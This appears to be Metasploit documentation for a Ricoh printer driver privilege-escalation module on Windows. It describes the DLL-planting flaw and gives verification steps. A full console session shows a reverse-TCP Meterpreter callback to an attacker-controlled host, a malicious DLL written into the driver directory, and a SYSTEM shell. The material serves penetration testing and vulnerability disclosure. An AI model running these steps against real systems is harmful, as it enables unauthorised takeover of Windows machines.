## Vulnerable Application

  [Various Ricoh printer drivers](https://www.ricoh.com/info/2020/0122_1/list) allow escalation of
  privileges on Windows systems.

  For vulnerable drivers, a low-privileged user can
  read/write files within the `RICOH_DRV` directory
  and its subdirectories.

  `PrintIsolationHost.exe`, a Windows process running
  as NT AUTHORITY\SYSTEM, loads driver-specific DLLs
  during the installation of a printer. A user can
  elevate to SYSTEM by writing a malicious DLL to
  the vulnerable driver directory and adding a new
  printer with a vulnerable driver.

## Verification Steps

  1. Install a vulnerable Ricoh driver
  2. Start msfconsole
  3. Get a session with basic privileges
  4. Do: ```use exploit/windows/local/ricoh_driver_privesc```
  5. Do: ```set SESSION <sess_no>```
  6. Do: ```run```
  7. You should get a shell running as SYSTEM.

## Options

  **FileWriteAttempts**

  This option is for setting the number of DLL write attempts.

  **FileWriteWait**

  This option is the amount of time to wait between each DLL write attempt.

## Scenarios

### Tested on Ricoh PCL6 Universal Driver `v4.13`

  ```
  msf5 > use multi/handler
  msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
  payload => windows/x64/meterpreter/reverse_tcp
  msf5 exploit(multi/handler) > set lhost 192.168.37.1
  lhost => 192.168.37.1
  msf5 exploit(multi/handler) > run

  [*] Started reverse TCP handler on 192.168.37.1:4444
  [*] Sending stage (206403 bytes) to 192.168.37.196
  [*] Meterpreter session 1 opened (192.168.37.1:4444 -> 192.168.37.196:49160) at 2020-02-03 16:14:20 -0600

  meterpreter > getuid
  Server username: WIN-FS4V2V58LEJ\Shelby Pace
  meterpreter > sysinfo
  Computer        : WIN-FS4V2V58LEJ
  OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x64/windows
  meterpreter > background
  [*] Backgrounding session 1...
  msf5 exploit(multi/handler) > use ricoh_driver_privesc

  Matching Modules
  ================

     #  Name                                        Disclosure Date  Rank    Check  Description
     -  ----                                        ---------------  ----    -----  -----------
     0  exploit/windows/local/ricoh_driver_privesc  2020-01-22       normal  Yes    Ricoh Driver Privilege Escalation


  [*] Using exploit/windows/local/ricoh_driver_privesc
  msf5 exploit(windows/local/ricoh_driver_privesc) > set session 1
  session => 1
  msf5 exploit(windows/local/ricoh_driver_privesc) > set payload windows/x64/meterpreter/reverse_tcp
  payload => windows/x64/meterpreter/reverse_tcp
  msf5 exploit(windows/local/ricoh_driver_privesc) > set lhost 192.168.37.1
  lhost => 192.168.37.1
  msf5 exploit(windows/local/ricoh_driver_privesc) > run

  [*] Started reverse TCP handler on 192.168.37.1:4444
  [*] Writing DLL to C:\ProgramData\RICOH_DRV\PCL6 Driver for Universal Print\_common\dlz\headerfooter.dll
  [*] Adding printer OgsHVa...
  [*] Sending stage (206403 bytes) to 192.168.37.196
  [*] Meterpreter session 2 opened (192.168.37.1:4444 -> 192.168.37.196:49161) at 2020-02-03 16:14:56 -0600
  [*] Sending stage (206403 bytes) to 192.168.37.196
  [*] Meterpreter session 3 opened (192.168.37.1:4444 -> 192.168.37.196:49162) at 2020-02-03 16:14:56 -0600
  [*] Deleting printer OgsHVa

  meterpreter > getuid
  Server username: NT AUTHORITY\SYSTEM
  meterpreter > sysinfo
  Computer        : WIN-FS4V2V58LEJ
  OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
  Architecture    : x64
  System Language : en_US
  Domain          : WORKGROUP
  Logged On Users : 2
  Meterpreter     : x64/windows
  ```
